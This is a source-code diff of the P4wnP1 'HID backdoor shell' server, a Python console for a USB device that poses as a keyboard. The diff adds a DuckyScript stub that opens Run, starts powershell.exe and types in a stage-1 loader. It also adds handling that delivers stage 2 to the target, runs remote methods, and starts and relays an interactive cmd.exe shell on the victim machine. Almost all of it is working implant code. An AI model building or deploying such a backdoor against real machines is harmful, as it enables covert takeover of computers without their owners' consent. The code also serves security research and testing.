@@ -1,4 +1,5 @@
 #!/usr/bin/python
+import time
 import cmd
 import sys
 import Queue
@@ -6,262 +7,13 @@ import struct
 from pydispatch import dispatcher
 from LinkLayer  import LinkLayer
 from TransportLayer import TransportLayer
-from threading import Thread, Condition
+from threading import Thread, Condition, Event
 from BlockingQueue import BlockingQueue
-
-class Channel():
-	def __init__(self, name, direction, type, subtype, id):
-		self.type = type
-		self.subtype = subtype
-		self.direction = direction # 0 in, any other out
-		self.name = name
-		self.id = id
-		self.bq = BlockingQueue(name=name)
-		
-		# should be replaced with struct.pack
-		self.__channel_header = chr((self.type << 4) + self.subtype) + chr(self.id)
-		self.__channel_header_len = len(self.__channel_header)
-		self.__external_condition = []
-	
-	def add_condition(self, cond):
-		self.__external_condition.append(cond)
-
-	def remove_condition(self, cond):
-		self.__external_condition.remove(cond)
-
-	def get_header(self):
-		return self.__channel_header
-
-	def data_available(self):
-		return self.bq.data_available()
-
-	# blocking
-	def read(self):
-		return self.bq.get()
-
-	def write(self, data):
-		for cond in self.__external_condition:
-			cond.acquire()
-
-		self.bq.put(data)			
-
-		for cond in self.__external_condition:
-			cond.notifyAll()
-			cond.release()
-		
-
-class RemoteProcess():
-
-	STATE_REQUEST_START = 0
-	STATE_STARTING = 1
-	STATE_RUNNING = 2
-	STATE_TERMINATING = 3
-	STATE_EXITED = 4
-
-	def __init__(self, id, name = "", cmdline = ""):
-		self.id = id # unique ID (mustn't necessarily be the real proccess ID, but good idea)
-		self.name = name
-		self.interacting = False
-		self.cmdline = cmdline
-
-		# note: a RemoteProcess is meant to be ran on remote client
-		#       thus from P4wnP1 server perspective its stdout is input,
-		#	while its stdin is output ... and so on
-		self.channels = (
-			Channel(name = "STDIN", direction = 1, type = 3, subtype = 1, id = self.id),
-			Channel(name = "STDOUT", direction = 0, type = 3, subtype = 2, id = self.id),
-			Channel(name = "STDERR", direction = 0, type = 3, subtype = 3, id = self.id),
-			Channel(name = "CTRL_TO_PROC", direction = 1, type = 3, subtype = 4, id = self.id),
-			Channel(name = "CTRL_FROM_PROC", direction = 0, type = 3, subtype = 5, id = self.id))
-
-		# fill dicts
-		self._namedict = {}
-		self._headerdict = {}
-		self._ins = {}
-		self._outs = {}
-		self.__cond_input = Condition() # thread condition which triggers if data is received on one of the input channels
-		for ch in self.channels:
-			self._namedict[ch.name] = ch
-			if ch.direction == 0: # in
-				self._ins[ch.name] = ch
-				ch.add_condition(self.__cond_input) # add input notifier threading condition to underlying channel
-				# !!! some cleanup should be implemented !!!
-			else:
-				self._outs[ch.name] = ch
-			
-			self._headerdict[ch.get_header()] = ch
-
-# this should be done by procmanager
-		# set state to starting and send startup message on control channel
-#		self.__state = RemoteProcess.STATE_REQUEST_START
-
-#		start_proc_message = "start cmd"
-#		self.write_to("CTRL_TO_PROC",start_proc_message)
-
-	def cleanup(self):
-		# remove condition from underlying channels
-		# destroy underlying channels and blockingqueues
-		pass
-
-	def get_in_channels(self):
-		return self._ins.values()
-
-	def get_out_channels(self):
-		return self._outs.values()
-
-	def get_channel_by_header(self, type, subtype):
-		header = chr((type << 4) + subtype) + chr(self.id)
-		return self._headerdict[header]
-
-	def write_to(self, channel_name, data):
-		self.__cond_input.acquire()
-		# should raise exception if channel not known
-		self._namedict[channel_name].write(data)
-
-		# if channel belongs to input channels, trigger threading condition
-		if channel_name in self._ins.keys():
-			self.__cond_input.notifyAll()
-
-		self.__cond_input.release()
-
-	# blocking
-	def read_from(self, channel_name):
-		# should raise exception if channel not known
-		self._namedict[channel_name].read()
-
-	def __in_channels_with_data(self):
-		channels_with_data = []
-		# check all input channels, if there's already data available
-		for ch in self._ins.values():
-			# if current channel has data available, ad name to channels_with_data
-			if ch.data_available():
-				channels_with_data.append(ch)
-		return channels_with_data
-
-	def wait_for_in_channels(self):
-		"""
-		Waits till one of the input channels received data and returns
-		
-		Note: The channel which was responsible to end the wait isn't
-		returned by this method to avoid errors, because meanwhile
-		other input channels could have received data. Not returning
-		the issuing channel forces checking of all input channels.
-
-		Example (for Error to be avoided):
-			STDOUT channel has been responsible for ending wait_for_in_channels().
-			If only pending STDOUT data is processed, data from STDERR would be missed
-			if arrived meanwhile.
-		"""
-
-		self.__cond_input.acquire()
-		
-		# if data was available on one of the channels, return immediately
-		channels_with_data = self.__in_channels_with_data()
-		if len(channels_with_data) > 0:
-			self.__cond_input.release()
-			return channels_with_data
-
-		# if we are here, there was no data in input channels and we wait for the threading condition
-		self.__cond_input.wait()
-
-		channels_with_data = self.__in_channels_with_data()
-		if len(channels_with_data) > 0:
-			self.__cond_input.release()
-			return channels_with_data
-
-		self.__cond_input.release()
-
-	def interact(self):
-		"""
-		If this method is called the underlying process is switched to interactive, this means:
-			- Input to stdin is readen in a continuous loop (till process exits, is ended or put to background)
-			- Received process output is (stderr/stdout) written to stdout
-		"""
-		print "Interacting with RemoteProcess {0} ID: {1}".format(self.name, self.id)
-
-		self.interacting = True
-		thread_output = Thread(target = self.__interact_output_loop, name = "Interact output loop proc {0} id {1}".format(self.name, self.id), args = ( ))
-
-		thread_output.start()
-		self.__interact_input_loop()
-
-
-	def __interact_input_loop(self):
-		while self.interacting:
-			cmd = sys.stdin.readline()
-
-			if cmd == "endinteract\n":
-				self.interacting = False
-				break
-
-			self.write_to("STDIN", cmd)
-
-	def __interact_output_loop(self):
-		while self.interacting:
-			ch_stderr = self._namedict["STDERR"]
-			ch_stdout = self._namedict["STDOUT"]
-
-			while ch_stderr.data_available():
-				data = ch_stderr.read()
-				sys.stderr.write(data)
-
-			while ch_stdout.data_available():
-				data = ch_stdout.read()
-				sys.stdout.write(data)
-
-
-class RemoteProcManager():
-	DEBUG = True
-
-	TYPE_REQUEST_PROC_START = 1 # arg0 = internal Proc ID, arg1 = cmdline
-	TYPE_REQUEST_PROC_KILL = 2 # arg0 = internal Proc ID
-	# if needed something like sleep could be added here
-
-
-	TYPE_RESPONSE_PROC_START_SUCCESS = 1 # arg0 = internal Proc ID
-	TYPE_RESPONSE_PROC_START_FAIL = 2 # arg0 = internal Proc ID
-	TYPE_RESPONSE_PROC_KILL_SUCESS = 3 # arg0 = internal Proc ID
-	TYPE_RESPONSE_PROC_KILL_FAIL = 4 # arg0 = internal Proc ID
-	TYPE_RESPONSE_PROC_NOTIFY_EXIT = 5 # arg0 = internal Proc ID, arg1 = ExitCode
-
-
-	def __init__(self):
-		RemoteProcManager.print_debug("init...")
-		self.next_id = 0
-		self.input_channels = {} # handles input channels of processes
-		self.output_channels = {}  # handles output channels of processes
-	
-
-
-	@staticmethod
-	def print_debug(str):
-		if RemoteProcManager.DEBUG:
-			print "RemoteProcManager (DEBUG): {}".format(str)
-		
-	def startProc(self, cmdline, name = ""):
-		RemoteProcManager.print_debug("startProc for cmdline '{0}'".format(cmdline))
-		
-		#generate next internal proc ID (approach isn't thread safe ... ultiple asynchronous calls possible ??)
-		internalProcID = self.next_id
-		self.next_id += 1
-
-		# create RemoteProcessObject
-		RP = RemoteProcess(internalProcID, name = name, cmdline = cmdline)
-
-		# add input channels of remote process to global list
-		for ch_in in RP.get_in_channels():
-			self.input_channels[ch_in.get_header()] = ch_in
-
-		# add output channels of remote process to global list
-		for ch_out in RP.get_out_channels():
-			self.output_channels[ch_out.get_header()] = ch_out
-	
-
-		# add startup request for process to control channel
-		msg = struct.pack("B{0}s".format(len(cmdline)), RP.id, cmdline)
-		RP.write_to("CTRL_TO_PROC", msg)
-
-                RemoteProcManager.print_debug("sent '{0}'".format(repr(msg)))
+from DuckEncoder import DuckEncoder
+from Config import Config
+from StageHelper import StageHelper
+from Channel import Channel
+from Client import *
 
 class P4wnP1(cmd.Cmd):
 	"""
@@ -269,132 +21,175 @@ class P4wnP1(cmd.Cmd):
 	... maybe not, who knows ?!
 	"""
 
-	DEBUG=True
-	
-	CHANNEL_TYPE_CONTROL = 1 # must exist only once
-	CHANNEL_TYPE_SOCKET = 2
-	CHANNEL_TYPE_PROCESS = 3
-	CHANNEL_TYPE_FILE_TRANSFER = 4
-	CHANNEL_TYPE_PORT_FORWARD = 5
-	CHANNEL_TYPE_SOCKS = 6
+	DEBUG=False
 
-	CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_REQUEST = 1 # send by peer (client) if it wants to receive stage2
-	CHANNEL_SUBTYPE_CONTROL_SERVER_STAGE2_RESPONSE = 1 # send by us (server) while delivering stage 2 (uses same value as request, as this is the other communication directin: server to client)
-	CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_RCVD = 2 # send by peer if stage 2 is received completly
-	CHANNEL_SUBTYPE_CONTROL_SERVER_SYSINFO_REQUEST = 3
-	CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE = 3 
+	# message types from CLIENT (powershell) to server (python)
+	CTRL_MSG_FROM_CLIENT_RESERVED = 0
+	CTRL_MSG_FROM_CLIENT_REQ_STAGE2 = 1
+	CTRL_MSG_FROM_CLIENT_RCVD_STAGE2 = 2
+	CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING = 3
+	CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE = 4 # response from a method ran on client
+	CTRL_MSG_FROM_CLIENT_ADD_CHANNEL = 5
+	CTRL_MSG_FROM_CLIENT_RUN_METHOD = 6 # client tasks server to run a method
 
-	# maybe unneeded, could be packed with data
-	CHANNEL_SUBTYPE_PROCESS_STDIN = 1
-	CHANNEL_SUBTYPE_PROCESS_STDOUT = 2
-	CHANNEL_SUBTYPE_PROCESS_STDERR = 3
-	CHANNEL_SUBTYPE_PROCESS_CTRL_TO_PROC = 4
-	CHANNEL_SUBTYPE_PROCESS_CTRL_FROM_PROC = 5
+	# message types from server (python) to client (powershell)
+	CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE = 1000
+	CTRL_MSG_FROM_SERVER_SEND_OS_INFO = 1001
+	CTRL_MSG_FROM_SERVER_SEND_PS_VERSION = 1002
+	CTRL_MSG_FROM_SERVER_RUN_METHOD = 1003 # server tasks client to run a method
+	CTRL_MSG_FROM_SERVER_ADD_CHANNEL_RESPONSE = 1004
+	CTRL_MSG_FROM_SERVER_RUN_METHOD_RESPONSE = 1005 # response from a method ran on server
 
-	CHANNEL_SUBTYPE_FILE_TRANSFER_SEND = 1
-	CHANNEL_SUBTYPE_FILE_TRANSFER_RECV = 2
-
-	CHANNEL_SUBTYPE_PORT_FORWARD_REMOTE = 1
-	CHANNEL_SUBTYPE_PORT_FORWARD_LOCAL = 1
-
-	# SOCKS subtype: recheck if needed, should be part of proto and
-	# (socks should be interpreted by client directly)
-	CHANNEL_SUBTYPE_SOCKS_START = 1
-	CHANNEL_SUBTYPE_SOCKS_END = 2
-	CHANNEL_SUBTYPE_SOCKS_CONNECT = 2
-	CHANNEL_SUBTYPE_SOCKS_ESTABLISHED = 2
-	CHANNEL_SUBTYPE_SOCKS_RESET = 2
-
-
-	def __init__(self, linklayer, transportlayer, stage2 = ""):
+	def __init__(self, linklayer, transportlayer, stage2 = "", duckencoder = None):
 		# state value to inform sub threads of running state
 		self.running = False	
 		self.stage2=stage2
 
-		self.control_sysinfo_response = BlockingQueue("CONTROL_SERVER_SYSINFO_RESPONSE")
+		self.client = Client() # object to monitor state of remote client
 
-		# channel  type/subtype received by input thread (to help handler to decide about responsibility on notify
-		self.received_channel_type = 0
-		self.received_channel_subtype = 0
-		self.received_channel_data = ""
-		self.received_stream_handled = False
+		self.control_sysinfo_response = BlockingQueue("CONTROL_SERVER_SYSINFO_RESPONSE")
 
 		self.server_thread_in = Thread(target = self.__input_handler, name = "P4wnP1 Server Input Loop", args = ( ))
 		self.server_thread_out = Thread(target = self.__output_handler, name = "P4wnP1 Server Output Loop", args = ( ))
 
+		self._next_client_method_id = 1
+
 		self.tl = transportlayer
 		self.ll = linklayer
 
-		self.rpm =RemoteProcManager()
+		self.__pending_server_methods = {}
+
+		self.duckencoder = duckencoder
+		
+
+		# register Listener for LinkLayer signals to upper layers (to receive LinkLayer connection events)
+		dispatcher.connect(self.signale_handler_transport_layer, sender="TransportLayerUp")
 
 		cmd.Cmd.__init__(self)
 		self.prompt = "P4wnP1 HID shell > "
+		self.intro = '''=================================
+P4wnP1 HID backdoor shell
+Author: MaMe82
+Web: https://github.com/mame82/P4wnP1
+State: Experimental (maybe forever ;-))
 
-		self.__create_channels()
-
-	def __create_channels(self):
-
-		# channel creation shown here should be handled by sort of "Register" method (implies Unregister method)
-
-		# channels for powershell RemoteProcess
-		# Note: As remote process creation isn't currently implemented, fixed number 222 is used
-		self.RPC_ps = RemoteProcess(222, "PowerShell")
-
-		self.input_channels = {}
-		# add input channels of PowerShell remote process
-		for ch_in in self.RPC_ps.get_in_channels():
-			self.input_channels[ch_in.get_header()] = ch_in
-
-		self.output_channels = {}
-		# add output channels of PowerShell remote process
-		for ch_out in self.RPC_ps.get_out_channels():
-			self.output_channels[ch_out.get_header()] = ch_out
-	
+Enter "help" for help
+================================='''
 
 	@staticmethod
 	def print_debug(str):
 		if P4wnP1.DEBUG:
 			print "P4wnP1 Server (DEBUG): {}".format(str)
+
+	########################
+	# Internal methods of P4wnP1 server
+	##########################
+	
+	def sendControlMessage(self, ctrl_message_type, payload):
+		ctrl_channel = 0
+
+		# construct header
+		ctrl_message = struct.pack("!II", ctrl_channel, ctrl_message_type)
+
+		# append payload
+		ctrl_message += payload
+
+		self.tl.write_stream(ctrl_message)
+	
+	def interactWithClientProcess(self, pid):
+		print "Trying to interact with process ID {0} ...".format(pid)
+		proc = self.client.getProcess(pid)
+		if not proc:
+			print "PID {0} not found or process not managed by P4wnP1".format(pid)
+			return
+
+
+		import select
 		
+		interacting = True
+		proc.setInteract(True) # let the process object inform the channel that stdout and stderr should be used
+		while interacting:
+			if not self.client.isConnected():
+				interacting = False
+				print "Client disconnected, stop interacting"
+				break
+
+			try:
+				#input = getpass.getpass()
+				# only read key if data available in stdin(avoid blocking stdout)
+				if select.select([sys.stdin], [], [], 0.05)[0]: # 50 ms timeout, to keep CPU load low
+					input = sys.stdin.readline()
+					print input
+					proc.writeStdin(input)
+			except KeyboardInterrupt:
+				interacting = False
+				proc.setInteract(False)
+				print "Interaction stopped by keyboard interrupt"
+
+	def addChannel(self, payload):
+		'''
+		Client requested new channel, add it...
+		'''
+		
+		ch_id, ch_type, ch_encoding  = struct.unpack("!IBB", payload)
+
+		P4wnP1.print_debug("Server add channel request. Channel id '{0}', type {1}, encoding {2}".format(ch_id, ch_type, ch_encoding))
+
+	def get_next_method_id(self):
+		next = self._next_client_method_id
+		# increase next_method id and cap to 0xFFFFFFFF
+		self._next_client_method_id = (self._next_client_method_id + 1) & 0xFFFFFFFF
+		return next
 
 	def start(self):
 		# start LinkLayer Threads
 		print "Starting P4wnP1 server..."
-		self.ll.start()
+		self.ll.start_background()
 		
 		self.running = True
 		self.server_thread_in.start()
-		print "Server input thread started."
+		P4wnP1.print_debug("Server input thread started.")
 		self.server_thread_out.start()
-		print "Server output thread started."
+		P4wnP1.print_debug("Server output thread started.")
 
 	def stop(self):
 		self.running = False
-
-	def send(self, channel_type, channel_subtype, data = ""):
-		stream = chr(channel_subtype + (channel_type << 4)) + data
-		self.tl.write_stream(stream)
 
 	def set_stage2(self, stage2_str):
 		self.stage2 = stage2_str
 
 	def __output_handler(self):
 		while self.running:
-                        # processing output data (of test channels)
-			for ch in self.output_channels.itervalues():
-				while ch.data_available(): # non blocking check
-					# send out data
-					outdata = ch.read() # blockin read
-					outstream = ch.get_header() + outdata
-					self.tl.write_stream(outstream)
+			pending_methods = self.client.getPendingMethods()
+
+			for method_id in pending_methods.keys():
+				method = pending_methods[method_id]
+
+				# check if method run has already been requested from client, do it if not
+				if not method.run_requested:
+					# request method run
+					method_request = method.createMethodRequest()
+					self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_RUN_METHOD, method_request)
+
+					# mark the method with "run requested"
+					method.run_requested = True
+					continue # step forward to next method
+
+				P4wnP1.print_debug("Pending method name: '{0}', ID: {1}".format(method.name, method.id))
+
+			# process pending output from client channels
+			###############################################
+			pendingOut = self.client.getPendingChannelOutput()
+			if len(pendingOut) > 0:
+				# push data to transport layer
+				for stream in pendingOut:
+					self.tl.write_stream(stream)
+
+
+			#time.sleep(5)
+			time.sleep(0.1)
+
 			
-			# handle channels of RemoteProcessManager
-			for ch in self.rpm.output_channels.itervalues():
-				while ch.data_available(): # non blocking check
-					# send out data
-					outdata = ch.read() # blockin read
-					outstream = ch.get_header() + outdata
-					self.tl.write_stream(outstream)
 
 	def __input_handler(self):
 		while self.running:
@@ -405,168 +200,330 @@ class P4wnP1(cmd.Cmd):
 			bytes_rcvd = 0
 			while self.tl.data_available():
 				stream = self.tl.pop_input_stream()
-				_byte1 = ord(stream[0])
-				channel_type = _byte1 >> 4
-				channel_subtype = _byte1 & 15
 
-				bytes_rcvd += len(stream)
+				# deconstruct stream into channel and channel payload (network order endianess)
+				ch,payload = struct.unpack("!I{0}s".format(len(stream) - 4), stream)
 
-				#print "P4wnP1 Server: received stream, channel type {0}, channel subtype {1}, data: {2}".format(channel_type, channel_subtype, data)
+				if (ch == 0):
+					# control channel, extract control message type
+					msg_type,payload = struct.unpack("!I{0}s".format(len(payload) - 4), payload)
+			
+					if msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_REQ_STAGE2:
+						P4wnP1.print_debug("indata: Control channel, control message STAGE2 REQUEST")
+						self.client.setStage2("REQUESTED")
+						# we send stage 2
+						response = struct.pack("!II{0}s".format(len(self.stage2)), 0, P4wnP1.CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE, self.stage2) # send back stage 2 as string on channel 0 (control channel) ...
+						self.tl.write_stream(response) # ... directly to transport layer
+					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RCVD_STAGE2:
+						self.client.setStage2("RECEIVED")
+					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING:
+						self.client.setStage2("RUNNING")
+					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE:
+						# handle method response
+						self.client.deliverMethodResponse(payload)
+					elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_OS_INFO:
+						self.client.setOSInfo(payload)
+					elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_PS_VERSION:
+						self.client.setPSVersion(payload)
+					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_ADD_CHANNEL:
+						self.addChannel(payload)
+					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD:
+						print "Run method request with following payload received: {0} ".format(repr(payload))
 
-				if channel_type == P4wnP1.CHANNEL_TYPE_CONTROL:
-					data = stream[1:]
-					P4wnP1.print_debug("Data received on control channel")
-					if channel_subtype == P4wnP1.CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_REQUEST:
-						P4wnP1.print_debug("Control channel: CLIENT_STAGE2_REQUEST")
-						# send back stage 2
-						self.send(P4wnP1.CHANNEL_TYPE_CONTROL, P4wnP1.CHANNEL_SUBTYPE_CONTROL_SERVER_STAGE2_RESPONSE, self.stage2)
-					elif channel_subtype == P4wnP1.CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_RCVD:
-						P4wnP1.print_debug("Control channel: CLIENT_STAGE2_RCVD")
-					elif channel_subtype == P4wnP1.CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE:
-						self.control_sysinfo_response.put(data.decode("UTF8"))
 					else:
-						P4wnP1.print_debug("Control channel: Unknown subtype {}".format(channel_subtype))
-				elif channel_type == P4wnP1.CHANNEL_TYPE_PROCESS:
-					_byte2 = ord(stream[1])
-					channel_id = _byte2
-					header = stream[:2]
-					data = stream[2:]
+						P4wnP1.print_debug("indata: Control channel, unknown control message type: {0}, payload: {1} ".format(msg_type, repr(payload)))
 
-					# check if we have a input channel for the header
-#					try:
-#						target_ch = self.input_channels[header]
-#					except KeyError:
-#						P4wnP1.print_debug("No channel found for input data with header {0}".format(header.encode("hex")))
-#						continue
-
-
-					target_ch = None
-					# check test channels
-					if (header in self.input_channels.keys()):
-						P4wnP1.print_debug("target channel found in test channels")					
-						target_ch = self.input_channels[header]
-					# check channels of RemoteProcessManager
-					elif (header in self.rpm.input_channels.keys()):
-						P4wnP1.print_debug("Channel for input data with header found in RemoteProcessManager {0}".format(header.encode("hex")))
-						target_ch = self.rpm.input_channels[header]
-					else:
-						P4wnP1.print_debug("No channel found for input data with header {0}".format(header.encode("hex")))
-						continue
-
-					# write data to the channel
-					target_ch.write(data)
-						
 				else:
-					P4wnP1.print_debug("Unknown channel type {0} (subtype {1})".format(channel_type, channel_subtype))
+					# as this is not a control channel, it has to be handled by the client object
+					#P4wnP1.print_debug("indata: for unknown channel channel {0}, payload: {1} ".format(ch, repr(payload)))
+					#P4wnP1.print_debug("indata: for channel channel {0}, payload: {1} ".format(ch, repr(payload)))
+					self.client.sendToInputChannel(ch, payload)
+
 
 
 	# loose definition, data argument has to be produced by LinkLayer
-	def handle_link_layer(self, signal, data):
-		print "LinkLayer Handler called.."
-		print "Signal:"
-		print signal
-		print "Data:"
-		print repr(data)
+	def signale_handler_transport_layer(self, signal, data):
+		P4wnP1.print_debug("LinkLayer signal: {0}".format(signal))
+
+		if signal == "TransportLayerClientConnectedLinkLayer":
+			# connection established
+			self.client.setLink(True)
+		elif signal == "TransportLayerConnectionResetLinkLayer":
+			self.client.setLink(False)
+		elif signal == "TransportLayerConnectionTimeoutLinkLayer":
+			#self.client.setLink(False)
+			pass
+		elif signal == "TransportLayerWaitingForClient" or signal == "TransportLayerSendStream":
+			# ignore these events
+			pass
+		else:
+			P4wnP1.print_debug("Unhandled LinkLayer signal: {0}".format(signal))
+
+	
+		
 
 	# overwrite cmd.emptyline()
 	def emptyline(self):
 		# do nothing
 		pass
 
-	# overwite cmdloop
-	def cmdloop(self):
-		print "Called custom cmd loop"
-		
-		# call parent
-		cmd.Cmd.cmdloop(self)
 
-	# methods called by underlying "cmd" module start with "do_..."
+
+
+	def handler_client_method_response(self, response):
+		# test handler, print response
+		print "Testhandler for client method, result:  " + repr(response)
+
+	###################
+	# caller methods and handlers for remote client methods
+	#####################
+
+	# CALLERS
+	def client_call_echo(self, echostring):
+		self.client.callMethod("core_echo", echostring, self.handler_client_echotest, waitForResult = True)
+
+	def client_call_get_proc_list(self, waitForResult = False):
+		self.client.callMethod("core_get_client_proc_list", "", self.handler_client_get_proc_list, waitForResult = waitForResult)
+		
+	def client_call_create_shell_proc(self, shell="cmd.exe"):
+		args=""
+		method_args = struct.pack("!B{0}sx{1}sx".format(len(shell), len(args)), 1, shell, args) # create null terminated strings from process name and args
+		# we could use the create proc handler
+		proc = self.client.callMethod("core_create_proc", method_args, self.handler_client_create_shell_proc, waitForResult = True, deliverResult = True)
+		if proc:
+			self.interactWithClientProcess(proc.id)
+
+	def client_call_create_proc(self, filename, args, use_channels = True, waitForResult = False):
+		# build arguments: [String] ProcFilename + [String] ProcArgs
+		use_channels_byte = 0
+		if use_channels:
+			use_channels_byte = 1
+		method_args = struct.pack("!B{0}sx{1}sx".format(len(filename), len(args)), use_channels_byte, filename, args) # create null terminated strings from process name and args
+
+		self.client.callMethod("core_create_proc", method_args, self.handler_client_create_proc, waitForResult = waitForResult)
+
+	def client_call_inform_channel_added(self, channel):
+		self.client.callMethod("core_inform_channel_added", struct.pack("!I", channel.id), self.handler_client_inform_channel_added, waitForResult = False)
+	# HANDLER
+	def handler_client_echotest(self, response):
+		print response
+
+	def handler_client_get_proc_list(self, response):
+		print response.replace("\r\n", "\n")
+		
+	def handler_client_create_shell_proc(self, response):
+		return self.handler_client_create_proc(response)
+		
+	def handler_client_create_proc(self, response):
+		proc_id, uses_channels, ch_stdin, ch_stdout, ch_stderr = struct.unpack("!IBIII", response)
+
+		uses_channels = bool(uses_channels) # convert bool
+
+		if uses_channels:
+			P4wnP1.print_debug("Process created channels, PID: {0}, CH_STDIN: {1}, CH_STDOUT: {2}, CH_STDERR: {3}".format(proc_id, ch_stdin, ch_stdout, ch_stderr))
+			
+			# we keep track of the process channels in client state, thus we create and add channels
+
+			# create STDIN channel
+			ch_stdin = Channel(ch_stdin, Channel.TYPE_OUT, Channel.ENCODING_UTF8) # from our perspective, this is an OUT channel (IN on client)
+			# create STDOUT channel
+			ch_stdout = Channel(ch_stdout, Channel.TYPE_IN, Channel.ENCODING_UTF8) # from our perspective, this is an IN channel (OUT on client)
+			# create STDERR channel
+			ch_stderr = Channel(ch_stderr, Channel.TYPE_IN, Channel.ENCODING_UTF8) # from our perspective, this is an IN channel (OUT on client)
+
+			self.client.addChannel(ch_stdin)
+			self.client.addChannel(ch_stdout)
+			self.client.addChannel(ch_stderr)
+
+			proc = ClientProcess(proc_id, ch_stdin, ch_stdout, ch_stderr)
+
+			self.client.addProc(proc)
+			
+			
+			#self.client.callMethod("core_inform_channel_added", struct.pack("!I", ch_stdin.id), self.handler_core_inform_channel_added, waitForResult = False)
+			#self.client.callMethod("core_inform_channel_added", struct.pack("!I", ch_stdout.id), self.handler_core_inform_channel_added, waitForResult = False)
+			#self.client.callMethod("core_inform_channel_added", struct.pack("!I", ch_stderr.id), self.handler_core_inform_channel_added, waitForResult = False)
+			
+			self.client_call_inform_channel_added(ch_stdin)
+			self.client_call_inform_channel_added(ch_stderr)
+			self.client_call_inform_channel_added(ch_stdout)
+		
+			print "Process with ID {0} created".format(proc_id)
+			return proc
+		else:
+			print "Process created without channels, PID: {0}".format(proc_id)
+		
+
+		
+		# retrieve process info
+
+	def handler_client_inform_channel_added(self, response):
+		P4wnP1.print_debug("Channel added inform " + repr(response))
+	
+	###################
+	# interface methods callable from P4wnP1 console
+	#####################
+
+	def do_CreateProc(self, line):
+		'''
+		This remote Powershell method calls "core_create_proc" in order to create a remote process
+		The response is handled by "handler_client_core_create_proc()"
+		'''
+
+		if not self.client.isConnected():
+			print "Not possible, client not connected"
+			return
+
+		if " " in line:
+			proc_name, proc_args = line.split(" ",1)
+		else:
+			proc_name = line
+			proc_args = ""
+
+		self.client_call_create_proc(proc_name, proc_args, use_channels = True, waitForResult = False)
+
+	def do_GetClientProcs(self, line):
+		'''
+		Print a list of processes managed by the remote client
+		'''
+
+		if not self.client.isConnected():
+			print "Not possible, client not connected"
+			return
+
+		self.client_call_get_proc_list(waitForResult = True)
+
+	def do_shell(self, line):
+		if not self.client.isConnected():
+			print "Not possible, client not connected"
+			return
+		self.client_call_create_shell_proc()
+
+		
+	def do_run_method(self, line):
+		if " " in line:
+			method_name, method_args = line.split(" ",1)
+		else:
+			method_name = line
+			method_args = ""
+
+		self.client.callMethod(method_name, method_args, self.handler_client_method_response)
+		
+	def do_SendKeys(self, line):
+		'''
+		Prints out everything on target through HID keyboard. Be sure to set the correct keyboard language for your target.
+		'''
+		self.duckencoder.outhidStringDirect(line)
+	
+	def do_TriggerStage1(self, line):
+		'''
+		Triggers stage 1 via HID attack. Be sure to have coorect target keyboard language set.
+		'''
+		#time.sleep(3)
+		ps_stub ='''
+			GUI r
+			DELAY 500
+			STRING powershell.exe
+			ENTER
+			DELAY 1000
+		'''
+		
+		ps_script = StageHelper.out_PS_Stage1_invoker("Stage1.dll")
+				
+		self.duckencoder.outhidDuckyScript(ps_stub) # print DuckyScript stub
+		self.duckencoder.outhidStringDirect(ps_script + "\n") # print stage1 PowerShell script
+	
+	def do_SetTargetKeyboardLanguage(self, line):
+		'''
+		Sets the language for target keyboard interaction
+		'''
+		print self.duckencoder.setLanguage(line.lower())
+		
+	def do_GetTargetKeyboardLanguage(self, line):
+		'''
+		Gets the language for target keyboard interaction
+		'''
+		print self.duckencoder.getLanguage()
+
+	def do_interact(self, line):
+		if not self.client.isConnected():
+			print "Not possible, client not connected"
+			return
+
+		pid = line.split(" ")[0]
+		if pid == "":
+			print "No process ID given, choose from:"
+			procs = self.client.getProcsWithChannel()
+			for p in procs:
+				print "{0}".format(p.id)
+			return
+
+		try:
+			pid = int(pid.strip())
+		except ValueError:
+			print "No valid process id: {0}".format(pid)
+			return
+
+		self.interactWithClientProcess(pid)
+			
 	def do_exit(self, line):
 		print "Exitting..."
 		# self.ll.stop() # should happen in global finally statement
 		sys.exit()
 
-	def do_ps(self, line):
-		"""
-		Call a single PowerShell cmdlet on remote host and print the result.
-
-		STDERR is returned, too.
-
-		Note: 	Current implementation isn't robust against cmdlets forcing user interaction
-			on the host. Calling "Read-Host" for instance, will block this call forever,
-			as data won't be returned without interaction from the remote host itself.
-		"""
-		if len(line) > 0:
-			# send line to PowerShell input stream (header is added by outstream)
-			self.RPC_ps.write_to("STDIN", line)
-
-			# wait till some response is received
-			channels_with_data = self.RPC_ps.wait_for_in_channels()
-
-			# !!! by design wait_for_in_channels() returns ONLY channels
-			# which contain data at time of calling
-			
-			# print out all received output
-			for ch in channels_with_data:
-				if ch.name == "STDERR":
-					print "PowerShell Error: \n{0}".format(ch.read())
-				elif ch.name == "STDOUT":
-					print ch.read()
-				else:
-					print "Data from unexpected channel {0}: {1}".format(ch.name, ch.read())
-	
-
-	def do_interact(self, line):
-		"""
-		Interacts with a process
-		"""
-		# - should take internal ProcID as arg to select the right proc
-		# - has to validate that the process is running and added to proc list
+	def do_state(self, line):
+		self.client.print_state()
+	def do_echotest(self, line):
+		'''
+		This is a test of calling a remote method on the client and wait for the result to get delivered
+		The remote Powershell method itself is "core_echo" which sends back all arguments given.
+		The response is handled by "handler_client_echotest()"
+		'''
 		
-		# for testing pruposes RPC_ps is used (until proc management is implemented)
-		self.RPC_ps.interact()
+		self.client_call_echo(line)
 
-	def do_systeminfo(self, line):
-		print "Waiting for target to deliver systeminfo..."
